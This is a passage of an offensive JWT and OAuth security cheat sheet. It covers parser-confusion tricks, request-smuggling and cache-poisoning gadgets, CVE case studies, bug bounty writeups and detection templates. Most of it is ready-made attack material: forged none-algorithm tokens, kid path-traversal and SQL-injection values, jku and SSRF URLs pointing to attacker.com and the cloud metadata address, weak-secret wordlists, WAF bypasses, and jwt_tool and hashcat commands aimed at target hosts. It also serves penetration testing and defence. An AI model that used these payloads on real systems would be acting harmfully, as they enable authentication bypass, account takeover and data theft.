Some parsers are lenient and accept standard Base64, which can cause confusion:
```
# Base64url
eyJhbGciOiJIUzI1NiJ9

# Standard Base64 (might be accepted)
eyJhbGciOiJIUzI1NiJ9=
```

### JSON Parsing Differences

```json
// Trailing commas
{"alg": "HS256", "typ": "JWT",}

// Single quotes
{'alg': 'HS256', 'typ': 'JWT'}

// Unquoted keys
{alg: "HS256", typ: "JWT"}

// Comments
{"alg": "HS256", /* comment */ "typ": "JWT"}
```

### Unicode Normalization

```json
{"alg": "\u006e\u006f\u006e\u0065"}  // "none"
{"alg": "\u0048\u0053\u0032\u0035\u0036"}  // "HS256"
```

Some parsers normalize Unicode before processing, bypassing string filters.

### URL Encoding in Headers

```json
{"alg": "%6e%6f%6e%65", "typ": "JWT"}  // URL-encoded "none"
```

### Multiple kid Headers

```json
{"kid": "real-key", "kid": "attacker-key", "alg": "HS256"}
```

Some parsers use the last occurrence, others the first.

---

## Gadget Chains

### Host Header Redirect Gadget

When the server uses the Host header for redirects:

```http
GET /+webvpn+/ HTTP/1.1
Host: attacker.com
```

Response:
```http
HTTP/1.1 302 Found
Location: https://attacker.com/+webvpn+/
```

**Chain with Request Smuggling:**
1. Smuggle request with Host header pointing to attacker
2. Server redirects victim to attacker-controlled domain
3. Attacker serves malicious JavaScript
4. JavaScript executes in context of target domain

### HEAD Method Splicing Gadget

Using HEAD to combine headers from one response with body from another:

```http
POST /assets HTTP/1.1
Host: target.com
Content-Length: 67

HEAD /404/?cb=123 HTTP/1.1

GET /x?<script>evil()</script> HTTP/1.1
X: Y
```

**Result:** Response has Content-Type: text/html from HEAD request + body from second request.

### JavaScript Resource Hijacking Gadget

```http
POST /robots.txt HTTP/1.1
Host: target.com
Content-Length: 50

GET /+webvpn+/ HTTP/1.1
Host: attacker.com
X: Y
```

Then navigate to page that loads JavaScript:
```javascript
fetch('https://target.com/robots.txt', {
    method: 'POST',
    body: 'GET /+webvpn+/ HTTP/1.1\r\nHost: attacker.com\r\nX: Y',
    credentials: 'include'
}).catch(() => {
    location = 'https://target.com/page-that-loads-js'
})
```

### Open Graph Hijacking Gadget

```http
GET /en HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
```

Response:
```html
<meta property="og:url" content='https://attacker.com/en'/>
```

When shared on social media, the poisoned URL is shared instead.

---

## Parser Confusion Payloads

### Algorithm Confusion Payloads

```json
{"alg": ["none", "HS256"]}
{"alg": {"alg": "none"}}
{"alg": "HS256\u0000"}
{"alg": "HS256 "}
{"alg": " HS256"}
{"alg": "HS256\n"}
{"alg": "HS256\t"}
```

### Type Confusion

```json
{"alg": 0}
{"alg": null}
{"alg": true}
{"alg": ["HS256"]}
```

### kid Confusion

```json
{"kid": null}
{"kid": 123}
{"kid": ["key1", "key2"]}
{"kid": {"id": "key1"}}
{"kid": "../../../etc/passwd"}
{"kid": "\\\\windows\\win.ini"}
```

### typ Confusion

```json
{"typ": "JWT"}
{"typ": "jwt"}
{"typ": "JWS"}
{"typ": "jwe"}
{"typ": "application/json"}
{"typ": "text/xml"}  // XXE pivot
```

### cty Content-Type Pivot

```json
{"alg": "HS256", "cty": "text/xml"}
```

Can enable XXE if the parser processes payload as XML.

```json
{"alg": "HS256", "cty": "application/x-java-serialized-object"}
```

Can enable deserialization attacks.

### Empty/Null Payloads

```
eyJhbGciOiJIUzI1NiJ9..  // Empty payload

eyJhbGciOiJIUzI1NiJ9.e30.  // Payload is {}

eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.  // No payload at all
```

---

## Real World Case Studies

### Case Study 1: Auth0 JWT Validation Bypass (CVE-2019-7644)

**Vulnerability:** Signature disclosure in error messages.

When sending a JWT with an incorrect signature, the endpoint responded with:
```
Invalid signature. Expected SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c got 9twuPVu9Wj3PBneGw1ctrf3knr7RX12v-UwocfLhXIs
```

This leaked the correct signature, allowing attackers to forge valid tokens.

### Case Study 2: Cisco node-jose Key Injection (CVE-2018-0114)

**Vulnerability:** node-jose library trusted embedded JWK headers.

**Impact:** Attackers could embed their own public key and re-sign tokens.

**Affected:** Applications using node-jose < 0.11.0

### Case Study 3: Amazon CL.0 Desync (2021)

**Vulnerability:** Amazon ignored Content-Length on POST to `/b/` endpoints.

**Impact:** Request smuggling allowed stealing other users' requests including authentication tokens.

**Attack:**
```http
POST /b/ HTTP/2
Host: www.amazon.com
Content-Length: 23

GET /404 HTTP/1.1
X: X
```

### Case Study 4: Mozilla SHIELD Cache Poisoning

**Vulnerability:** X-Forwarded-Host header caused Firefox SHIELD system to fetch recipes from attacker domain.

**Impact:** Could potentially distribute malicious extensions to millions of Firefox users.

**Attack:**
```http
GET /api/v1/ HTTP/1.1
Host: normandy.cdn.mozilla.net
X-Forwarded-Host: attacker.com
```

### Case Study 5: MITREid Connect SSRF (CVE-2021-26715)

**Vulnerability:** Dynamic client registration `logo_uri` triggered SSRF.

**Impact:** Unauthenticated SSRF + XSS on OAuth authorization server.

**Attack:**
```http
POST /openid-connect-server-webapp/register HTTP/1.1
Content-Type: application/json

{
    "redirect_uris": ["http://attacker.com/redirect"],
    "logo_uri": "http://attacker.com/xss.html"
}
```

Then accessing `/api/clients/{id}/logo` triggered the SSRF.

### Case Study 6: ForgeRock/MITREid redirect_uri Poisoning (CVE-2021-27582)

**Vulnerability:** Session poisoning via mass assignment on OAuth confirmation page.

**Impact:** Authorization code/token leakage to attacker-controlled redirect_uri.

**Attack:**
```
/authorize?client_id=TRUSTED&redirect_uri=http://trusted.com
/oauth/confirm_access?client_id=TRUSTED&redirectUri=http://attacker.com
```

### Case Study 7: Psychic Signature (CVE-2022-21449)

**Vulnerability:** Java's ECDSA implementation accepted blank signatures.

**Impact:** Any JWT with `alg: ES256` and empty signature was accepted as valid.

**Affected:** Java 15, 16, 17, 18

**Payload:**
```
eyJhbGciOiJFUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.  // Empty signature
```

**Detection:**
```bash
# Test with empty ECDSA signature
jwt_tool.py JWT_HERE -X p  # Psychic signature test
```

---

## Fuzzing Payloads

### Algorithm Fuzzing

```
none
None
NONE
nOnE
HS256
HS384
HS512
RS256
RS384
RS512
ES256
ES384
ES512
PS256
PS384
PS512
A128KW
A256KW
RSA-OAEP
RSA-OAEP-256
ECDH-ES
ECDH-ES+A128KW
ECDH-ES+A256KW
A128GCMKW
A256GCMKW
PBES2-HS256+A128KW
PBES2-HS512+A256KW
```

### kid Fuzzing Payloads

```
null
../../etc/passwd
../../../dev/null
..\\windows\\win.ini
/proc/self/environ
/proc/version
/etc/hostname
/etc/passwd
C:/windows/win.ini
http://attacker.com/key
file:///etc/passwd
php://filter/read=convert.base64-encode/resource=index.php
expect://id
' OR '1'='1
' UNION SELECT secret FROM keys --
1 AND 1=1
1' AND 1=1 --
```

### jku Fuzzing Payloads

```
http://attacker.com/jwks.json
https://attacker.com/jwks.json
ftp://attacker.com/jwks.json
file:///etc/passwd
http://169.254.169.254/latest/meta-data/
http://localhost:8080/jwks.json
http://127.0.0.1:8080/jwks.json
dns://attacker.com
ldap://attacker.com
```

### Claim Fuzzing

```json
{"sub": "admin"}
{"sub": "administrator"}
{"sub": "root"}
{"role": "admin"}
{"role": "administrator"}
{"isAdmin": true}
{"is_admin": true}
{"admin": true}
{"privilege": "admin"}
{"type": "admin"}
{"groups": ["admin"]}
{"scope": "admin"}
{"permissions": ["*"]}
{"access": "full"}
{"level": 999}
{"rank": 0}
{"id": 1}
{"user_id": 1}
{"account_id": 1}
{"exp": 9999999999}
{"iat": 0}
{"nbf": 0}
{"aud": "admin"}
{"iss": "admin"}
```

### Header Injection Fuzzing

```json
{"alg": "HS256", "kid": "test"}
{"alg": "HS256", "jku": "http://test"}
{"alg": "HS256", "jwk": {"kty": "RSA"}}
{"alg": "HS256", "x5u": "http://test"}
{"alg": "HS256", "x5c": ["test"]}
{"alg": "HS256", "cty": "text/xml"}
{"alg": "HS256", "crit": ["exp"]}
{"alg": "HS256", "b64": false}
{"alg": "HS256", "url": "http://test"}
{"alg": "HS256", "nonce": "test"}
```

---

## Automation Workflows

### jwt_tool Complete Workflow

```bash
# 1. RECON - Decode and analyze token
python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...

# 2. SCAN - Playbook scan against application
python3 jwt_tool.py -t https://target.com/     -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...;session=abc"     -cv "Welcome" -M pb

# 3. EXPLOIT - If vulnerability found
python3 jwt_tool.py -t https://target.com/     -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..."     -X i -I -pc name -pv admin

# 4. FUZZ - Deep testing
python3 jwt_tool.py -t https://target.com/     -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..."     -I -hc kid -hv custom_sqli_vectors.txt

# 5. BRUTEFORCE - Weak secret
python3 jwt_tool.py JWT_HERE -d /tmp/wordlist -C
```

### Burp Suite + JWT Editor Workflow

1. Install JWT Editor extension from BApp Store
2. Capture JWT in proxy history
3. Send to Repeater
4. Switch to "JSON Web Token" tab
5. Modify claims as needed
6. Use Attack menu for:
   - Embedded JWK
   - JKU injection
   - Algorithm confusion
   - Sign with custom key

### Automated Recon Pipeline

```bash
#!/bin/bash
# jwt_recon.sh

TARGET=$1
JWT=$2

echo "[+] Decoding JWT..."
echo $JWT | jwt_tool.py

echo "[+] Checking for known vulnerabilities..."
jwt_tool.py $JWT -M pb

echo "[+] Brute-forcing secret..."
jwt_tool.py $JWT -d /usr/share/wordlists/jwt.secrets.list -C

echo "[+] Testing algorithm confusion..."
jwt_tool.py $JWT -X k -pk public.pem

echo "[+] Testing none algorithm..."
jwt_tool.py $JWT -X a

echo "[+] Testing null signature..."
jwt_tool.py $JWT -X n

echo "[+] Testing key injection..."
jwt_tool.py $JWT -X i

echo "[+] Testing JKU injection..."
jwt_tool.py $JWT -X s
```

### Mass JWT Testing

```bash
# Extract JWTs from HTTP history
grep -oP 'eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9._-]*' requests.log > jwts.txt

# Test all JWTs
while read jwt; do
    echo "Testing: $jwt"
    jwt_tool.py $jwt -d /tmp/wordlist -C 2>/dev/null
    jwt_tool.py $jwt -X a 2>/dev/null
    jwt_tool.py $jwt -X n 2>/dev/null
done < jwts.txt
```

---

## Recon Methodology

### Step 1: Identify JWT Usage

```bash
# Search for JWTs in traffic
grep -r "eyJ" burp-export/
grep -r "Authorization: Bearer" burp-export/
grep -r "token=" burp-export/
grep -r "jwt=" burp-export/
grep -r "id_token=" burp-export/
grep -r "access_token=" burp-export/
```

**Burp Search Regex:**
```
[= ]eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9._-]*    # URL-safe JWT
[= ]eyJ[A-Za-z0-9_\/+-]*\.[A-Za-z0-9._\/+-]*  # All JWT versions
```

### Step 2: Analyze JWT Structure

```bash
# Decode header
echo "HEADER" | base64 -d 2>/dev/null | jq .

# Decode payload  
echo "PAYLOAD" | base64 -d 2>/dev/null | jq .

# Check algorithm
jwt_tool.py JWT_HERE
```

### Step 3: Check for JWKS Endpoints

```bash
# Common JWKS locations
curl https://target.com/.well-known/jwks.json
curl https://target.com/jwks.json
curl https://target.com/openid/connect/jwks.json
curl https://target.com/api/keys
curl https://target.com/.well-known/openid-configuration
```

### Step 4: Check for OAuth/OpenID Endpoints

```bash
# OpenID Discovery
curl https://target.com/.well-known/openid-configuration

# OAuth endpoints to check
curl https://target.com/oauth/authorize
curl https://target.com/oauth/token
curl https://target.com/oauth/register
curl https://target.com/connect/register
curl https://target.com/.well-known/webfinger
```

### Step 5: Test Signature Verification

```bash
# Test if signature is verified
# 1. Modify payload claim
# 2. Send request
# 3. If accepted -> signature not verified

# Test with jwt_tool
jwt_tool.py JWT_HERE -T  # Tamper and test
```

### Step 6: Test for Known Vulnerabilities

```bash
# None algorithm
jwt_tool.py JWT_HERE -X a

# Null signature
jwt_tool.py JWT_HERE -X n

# Key confusion
jwt_tool.py JWT_HERE -X k -pk public.pem

# Key injection
jwt_tool.py JWT_HERE -X i

# JKU injection
jwt_tool.py JWT_HERE -X s

# Weak secret
jwt_tool.py JWT_HERE -d wordlist -C
```

### Step 7: Check for Secondary Vulnerabilities

- SSRF via `jku`, `x5u`, `kid`
- Path traversal via `kid`
- SQL injection via `kid`
- Command injection via `kid`
- XXE via `cty: text/xml`
- Deserialization via `cty: application/x-java-serialized-object`

---

## Nuclei Templates

### JWT None Algorithm Detection

```yaml
id: jwt-none-algorithm

info:
  name: JWT None Algorithm Support
  author: your-name
  severity: critical
  description: |
    The application accepts JWTs with 'none' algorithm,
    allowing signature bypass.
  tags: jwt,auth-bypass

requests:
  - raw:
      - |
        GET /api/admin HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer {{none_jwt}}

    payloads:
      none_jwt:
        - eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.

    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "admin"
          - "success"
        condition: or
```

### JWT Weak Secret Detection

```yaml
id: jwt-weak-secret

info:
  name: JWT Weak Secret
  author: your-name
  severity: high
  description: |
    The JWT uses a weak/known secret that can be brute-forced.
  tags: jwt,weak-secret

requests:
  - raw:
      - |
        GET /api/user HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer {{token}}

    payloads:
      token:
        - eyJhbGciOiJIUzI1NiJ9...  # Original token

    matchers:
      - type: status
        status:
          - 200
```

### JWT JKU Injection Detection

```yaml
id: jwt-jku-injection

info:
  name: JWT JKU Header Injection
  author: your-name
  severity: critical
  description: |
    The application fetches JWKS from user-controlled URLs.
  tags: jwt,jku,ssrf

requests:
  - raw:
      - |
        GET /api/user HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer {{jku_jwt}}

    payloads:
      jku_jwt:
        - eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly97e2ludGVyYWN0c2gtdXJsfX0ifQ...  # JKU pointing to interactsh

    matchers:
      - type: word
        words:
          - "interactsh"
```

### JWT kid Path Traversal Detection

```yaml
id: jwt-kid-path-traversal

info:
  name: JWT kid Path Traversal
  author: your-name
  severity: critical
  description: |
    The kid parameter is vulnerable to path traversal.
  tags: jwt,kid,lfi

requests:
  - raw:
      - |
        GET /api/admin HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer {{kid_jwt}}

    payloads:
      kid_jwt:
        - eyJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uL2Rldi9udWxsIn0...  # kid=../../../../../../../dev/null

    matchers:
      - type: status
        status:
          - 200
```

### OAuth Dynamic Registration SSRF

```yaml
id: oauth-registration-ssrf

info:
  name: OAuth Dynamic Registration SSRF
  author: your-name
  severity: high
  description: |
    OAuth dynamic client registration accepts URLs that trigger SSRF.
  tags: oauth,ssrf,jwt

requests:
  - raw:
      - |
        POST /connect/register HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {
          "redirect_uris": ["https://example.com"],
          "logo_uri": "http://{{interactsh-url}}",
          "jwks_uri": "http://{{interactsh-url}}"
        }

    matchers:
      - type: word
        words:
          - "interactsh"
```

---
## Tools and Scanners

### jwt_tool

**Description:** Comprehensive JWT testing toolkit.

**Installation:**
```bash
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool
pip3 install -r requirements.txt
```

**Key Features:**
- Token validation and decoding
- Known exploit testing (CVE-2015-2951, CVE-2016-10555, CVE-2018-0114, etc.)
- Weak key dictionary attack
- Token forging and tampering
- Timestamp manipulation
- RSA/ECDSA key generation
- JWKS reconstruction
- Rate-limited attacks

**Common Commands:**
```bash
# Basic recon
jwt_tool.py <JWT>

# Scan against application
jwt_tool.py -t https://target.com/ -rc "jwt=<JWT>" -M pb

# Exploit specific vulnerability
jwt_tool.py -t https://target.com/ -rc "jwt=<JWT>" -X a  # None algorithm
jwt_tool.py -t https://target.com/ -rc "jwt=<JWT>" -X k -pk public.pem  # Key confusion
jwt_tool.py -t https://target.com/ -rc "jwt=<JWT>" -X i  # Key injection
jwt_tool.py -t https://target.com/ -rc "jwt=<JWT>" -X s  # JKU injection
jwt_tool.py -t https://target.com/ -rc "jwt=<JWT>" -X n  # Null signature

# Bruteforce secret
jwt_tool.py <JWT> -d /path/to/wordlist -C

# Tamper claims
jwt_tool.py <JWT> -T

# Fuzz claims
jwt_tool.py -t https://target.com/ -rc "jwt=<JWT>" -I -hc kid -hv sqli.txt
```

### hashcat

**Description:** High-performance password/hash cracking.

**JWT Mode:** `-m 16500`

**Commands:**
```bash
# Dictionary attack
hashcat -a 0 -m 16500 jwt.txt wordlist.txt

# Rule-based attack
hashcat -a 0 -m 16500 jwt.txt passlist.txt -r rules/best64.rule

# Brute force
hashcat -a 3 -m 16500 jwt.txt ?u?l?l?l?l?l?l?l -i --increment-min=6

# Show cracked
hashcat -a 0 -m 16500 jwt.txt wordlist.txt --show
```

### Burp Suite JWT Editor

**Description:** Burp extension for JWT manipulation.

**Features:**
- Decode and edit JWTs in Repeater
- Generate RSA/symmetric keys
- Embedded JWK attacks
- JKU injection attacks
- Sign with custom keys
- Algorithm switching

**Installation:** BApp Store -> JWT Editor

### c-jwt-cracker

**Description:** Fast JWT brute-forcer written in C.

```bash
git clone https://github.com/brendan-rius/c-jwt-cracker
cd c-jwt-cracker
make
./jwtcrack eyJhbGciOiJIUzI1NiJ9... /usr/share/wordlists/rockyou.txt
```

### JOSEPH (PortSwigger)

**Description:** JavaScript Object Signing and Encryption Pentesting Helper.

```bash
# Available as Burp extension
# Provides additional JWT testing capabilities
```

### sig2n (PortSwigger)

**Description:** Derive RSA public key from two JWTs.

```bash
docker run --rm -it portswigger/sig2n <token1> <token2>
```

### jws2pubkey (Secura)

**Description:** Compute RSA public key from signed JWTs.

```bash
docker run -it ttervoort/jws2pubkey JWS1 JWS2
```

### Nuclei

**Description:** Fast vulnerability scanner.

**JWT Templates:**
```bash
# Run JWT-specific templates
nuclei -u https://target.com -t http/vulnerabilities/jwt/

# Custom JWT template
nuclei -u https://target.com -t jwt-template.yaml
```

### httpx (ProjectDiscovery)

**Description:** Fast HTTP prober.

```bash
# Check for JWKS endpoints
cat targets.txt | httpx -path /.well-known/jwks.json -mc 200

# Check for OpenID configuration
cat targets.txt | httpx -path /.well-known/openid-configuration -mc 200
```

### katana (ProjectDiscovery)

**Description:** Web crawler.

```bash
# Crawl for JWT-related endpoints
katana -u https://target.com -jc | grep -E "(jwks|openid|oauth|jwt)"
```

---

## Advanced Research

### CVE-2022-21449: Psychic Signature

**Vulnerability:** Java's ECDSA implementation accepted blank signatures.

**Impact:** Any JWT with `alg: ES256` and an empty or all-zero signature was accepted as valid.

**Affected:** Java 15, 16, 17, 18

**Payload:**
```
eyJhbGciOiJFUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.  // Empty signature
```

**Detection:**
```bash
# Test with empty ECDSA signature
jwt_tool.py JWT_HERE -X p  # Psychic signature test
```

### Novel Desync Techniques

**Pause-based Desync:**
- Varnish cache times out after 15 seconds on partial requests
- Leaves connection open for reuse
- Second half of request interpreted as new request

**H2.0 Desync:**
- HTTP/2 request without Content-Length
- ALB adds `Transfer-Encoding: chunked` during downgrade
- Body treated as chunked, enabling smuggling

**CL.0 Browser-Powered:**
- Server ignores Content-Length on unexpected POST requests
- Browser can trigger via fetch() with body
- Enables client-side desync attacks

### Web Cache Entanglement

When cache poisoning affects JWT validation endpoints:
1. Poison cache at `/api/verify` with malicious JWT validation logic
2. All subsequent JWT verifications use poisoned logic
3. Attacker JWTs accepted as valid for all users

### HTTP/2 Continuation Flood

HTTP/2 CONTINUATION frames can be abused to:
- Hide malicious headers from front-end
- Bypass JWT validation on front-end
- Deliver smuggled requests to back-end

---

## Bug Bounty Writeups

### Writeup 1: JWT Algorithm Confusion on Major Platform

**Researcher:** @filedescriptor
**Platform:** Private program
**Bounty:** $10,000

**Technique:**
1. Found RS256 JWT
2. Extracted public key from `/jwks.json`
3. Converted to PEM, base64-encoded
4. Created symmetric key with PEM as `k` value
5. Changed `alg` to HS256
6. Signed with public key as HMAC secret
7. Successfully impersonated admin user

**Key Takeaway:** Always check if the public key can be used as HMAC secret.

### Writeup 2: OAuth + JWT Chain on Enterprise App

**Researcher:** @artsploit
**Platform:** MITREid Connect
**Bounty:** $5,000

**Chain:**
1. Dynamic client registration SSRF via `logo_uri`
2. XSS on authorization server via fetched logo
3. Session poisoning via `redirect_uri`
4. Token leakage to attacker-controlled endpoint
5. JWT key injection via `jwk` header
6. Full account takeover

**Key Takeaway:** OAuth implementations have multiple JWT attack surfaces.

### Writeup 3: JWT kid SQL Injection

**Researcher:** Unknown
**Platform:** Financial application
**Bounty:** $3,000

**Technique:**
```json
{
    "kid": "' UNION SELECT secret FROM jwt_keys WHERE id=1 --",
    "alg": "HS256"
}
```

The application used `kid` in a SQL query to fetch the signing secret. SQL injection allowed extracting any secret.

**Key Takeaway:** `kid` is not just a string - it may be used in database queries.

### Writeup 4: JWT Parser Confusion

**Researcher:** @0xn3va
**Platform:** Multiple targets
**Bounty:** Various

**Technique:**
```json
{"alg": ["none", "HS256"]}
```

Some parsers iterate through array and accept first valid algorithm. If `none` is first, signature verification is skipped.

**Key Takeaway:** Test non-standard JSON structures in JWT headers.

---

## Payload Collections

### Complete None Algorithm Payloads

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.
eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.
eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.
eyJhbGciOiJuT25FIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJhZG1pbiI6dHJ1ZSwic3ViIjoiYWRtaW4ifQ.
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4iLCJpc0FkbWluIjp0cnVlfQ.
```

### Algorithm Confusion Payloads

```
# RS256 -> HS256
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.[SIGNATURE_WITH_PUBLIC_KEY_AS_SECRET]

# ES256 -> HS256
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9.[SIGNATURE_WITH_EC_PUBLIC_KEY_AS_SECRET]

# PS256 -> HS256
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9.[SIGNATURE_WITH_RSA_PSS_PUBLIC_KEY_AS_SECRET]
```

### kid Path Traversal Payloads

```json
{"kid": "../../../../../../../dev/null", "alg": "HS256"}
{"kid": "../../../etc/passwd", "alg": "HS256"}
{"kid": "..\\..\\..\\windows\\win.ini", "alg": "HS256"}
{"kid": "/proc/self/environ", "alg": "HS256"}
{"kid": "/proc/version", "alg": "HS256"}
{"kid": "/etc/hostname", "alg": "HS256"}
{"kid": "file:///etc/passwd", "alg": "HS256"}
{"kid": "php://filter/read=convert.base64-encode/resource=index.php", "alg": "HS256"}
{"kid": "http://attacker.com/key", "alg": "HS256"}
```

### JKU Injection Payloads

```json
{"alg": "RS256", "jku": "http://attacker.com/jwks.json"}
{"alg": "RS256", "jku": "https://attacker.com/jwks.json"}
{"alg": "RS256", "jku": "ftp://attacker.com/jwks.json"}
{"alg": "RS256", "jku": "file:///etc/passwd"}
{"alg": "RS256", "jku": "http://169.254.169.254/latest/meta-data/"}
{"alg": "RS256", "jku": "http://localhost:8080/jwks.json"}
{"alg": "RS256", "jku": "http://127.0.0.1:8080/jwks.json"}
```

### Embedded JWK Payloads

```json
{
  "alg": "RS256",
  "jwk": {
    "kty": "RSA",
    "e": "AQAB",
    "kid": "attacker",
    "n": "yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw"
  }
}
```

### Weak Secret Test Payloads

```
secret
password
123456
your-256-bit-secret
change_this_super_secret_random_string
jwt_secret
mysecret
token_secret
supersecret
admin
key
secretkey
test
dev
production
default
changeme
password123
qwerty
letmein
welcome
monkey
dragon
master
hello
```

### Claim Manipulation Payloads

```json
{"sub": "administrator", "role": "admin"}
{"sub": "admin", "isAdmin": true}
{"sub": "root", "privilege": "superuser"}
{"sub": "1", "user_id": 1, "account_type": "admin"}
{"sub": "victim", "role": "admin", "permissions": ["*"]}
{"sub": "test", "scope": "read write admin", "aud": "admin-api"}
{"sub": "user", "groups": ["administrators", "superusers"]}
{"sub": "user", "access_level": 999, "tier": "enterprise"}
```

---

## WAF Bypasses

### Case Variation Bypass

```json
{"ALG": "NONE"}
{"Alg": "None"}
{"aLg": "nOnE"}
```

### Encoding Bypass

```json
{"alg": "\u006e\u006f\u006e\u0065"}  // Unicode escapes
{"alg": "%6e%6f%6e%65"}  // URL encoding
{"alg": "\x6e\x6f\x6e\x65"}  // Hex escapes
```

### Whitespace Bypass

```json
{"alg": " none"}
{"alg": "none "}
{"alg": " none "}
{"alg": "n o n e"}
{"alg": "n\none"}
```

### Array/Object Bypass

```json
{"alg": ["none"]}
{"alg": ["none", "HS256"]}
{"alg": {"0": "none"}}
{"alg": [["none"]]}
```

### Null/Empty Bypass

```json
{"alg": null}
{"alg": ""}
{"alg": 0}
{"alg": false}
```

### Comment Bypass (if parser supports)

```json
{"alg": "HS256", /*none*/ "typ": "JWT"}
{"alg": "HS256//none", "typ": "JWT"}
```

### JSON Smuggling

```json
{"alg": "HS256", "typ": "JWT"}{"alg": "none", "typ": "JWT"}
```

Some parsers may parse the second JSON object.

---

## Detection Techniques

### Manual Detection Checklist

1. [ ] Identify JWT in requests (cookies, headers, localStorage)
2. [ ] Decode and analyze header (algorithm, kid, jku, jwk)
3. [ ] Decode and analyze payload (claims, expiration)
4. [ ] Check if signature is verified (modify claim, send request)
5. [ ] Test for `alg: none` acceptance
6. [ ] Test for null signature acceptance
7. [ ] Check for JWKS endpoints (`/.well-known/jwks.json`)
8. [ ] Test algorithm confusion (RS256 -> HS256)
9. [ ] Test JWK injection
10. [ ] Test JKU injection
11. [ ] Test kid path traversal
12. [ ] Bruteforce weak secrets
13. [ ] Check OAuth/OpenID endpoints
14. [ ] Test for SSRF via jku/x5u/kid
15. [ ] Test for SQL injection via kid
16. [ ] Check for cache poisoning vectors
17. [ ] Check for request smuggling vectors
18. [ ] Test parser confusion payloads

### Automated Detection

```bash
# jwt_tool playbook scan
jwt_tool.py -t https://target.com/ -rc "jwt=<JWT>" -M pb

# nuclei JWT templates
nuclei -u https://target.com -t http/vulnerabilities/jwt/

# Custom script
#!/bin/bash
JWT=$1
TARGET=$2

jwt_tool.py $JWT -X a > /dev/null 2>&1 && echo "[VULN] None algorithm"
jwt_tool.py $JWT -X n > /dev/null 2>&1 && echo "[VULN] Null signature"
jwt_tool.py $JWT -d /tmp/wordlist -C > /dev/null 2>&1 && echo "[VULN] Weak secret"
curl -s $TARGET/.well-known/jwks.json > /dev/null 2>&1 && echo "[INFO] JWKS found"
```

### Response Analysis

**Indicators of Vulnerability:**

| Response | Likely Vulnerability |
|----------|---------------------|
| 200 OK after claim modification | Unverified signature |
| 200 OK with `alg: none` | None algorithm accepted |
| 200 OK with empty signature | Null signature accepted |
| 200 OK with forged HS256 from RS256 | Algorithm confusion |
| 200 OK with embedded JWK | JWK injection accepted |
| 200 OK with custom JKU | JKU injection accepted |
| 200 OK with `kid` path traversal | Path traversal in kid |
| Error disclosing correct signature | CVE-2019-7644 |
| Different response timing | Timing attack possible |

---

## References

### Official Specifications

- [RFC 7519 - JSON Web Token (JWT)](https://datatracker.ietf.org/doc/html/rfc7519)
- [RFC 7515 - JSON Web Signature (JWS)](https://datatracker.ietf.org/doc/html/rfc7515)
- [RFC 7516 - JSON Web Encryption (JWE)](https://datatracker.ietf.org/doc/html/rfc7516)
- [RFC 7517 - JSON Web Key (JWK)](https://datatracker.ietf.org/doc/html/rfc7517)
- [RFC 7518 - JSON Web Algorithms (JWA)](https://datatracker.ietf.org/doc/html/rfc7518)
- [RFC 7523 - JWT Profile for OAuth 2.0 Client Authentication](https://datatracker.ietf.org/doc/html/rfc7523)
- [OpenID Connect Core 1.0](https://openid.net/specs/openid-connect-core-1_0.html)
- [OAuth 2.0 Dynamic Client Registration](https://datatracker.ietf.org/doc/html/rfc7591)

### PortSwigger Research

- [JWT Attacks - Web Security Academy](https://portswigger.net/web-security/jwt)
- [Algorithm Confusion Attacks](https://portswigger.net/web-security/jwt/algorithm-confusion)
- [Cracking JSON Web Tokens](https://portswigger.net/research/cracking-json-web-tokens)
- [Hidden OAuth Attack Vectors](https://portswigger.net/research/hidden-oauth-attack-vectors)
- [Practical Web Cache Poisoning](https://portswigger.net/research/practical-web-cache-poisoning)
- [Browser-Powered Desync Attacks](https://portswigger.net/research/browser-powered-desync-attacks)
